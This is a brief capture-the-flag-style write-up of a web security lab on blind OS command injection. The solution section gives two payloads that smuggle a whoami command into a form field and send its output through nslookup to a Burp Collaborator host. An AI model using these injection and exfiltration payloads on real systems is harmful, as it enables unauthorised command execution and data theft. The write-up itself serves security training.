# Lab  5 - Blind OS command injection with out-of-band data exfiltration (Running commands like whoami)

`To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.`


### Solution - 

Same process as above but add this payload

- ` & nslookup `whoami`.zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # ` /  ` & nslookup $(whoami).zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # `

We get the username in the details panel - `peter-iQRvf5`

![image](https://user-images.githubusercontent.com/67383098/225319008-28f90fcf-53d6-4237-b84d-bcd563b8a882.png)





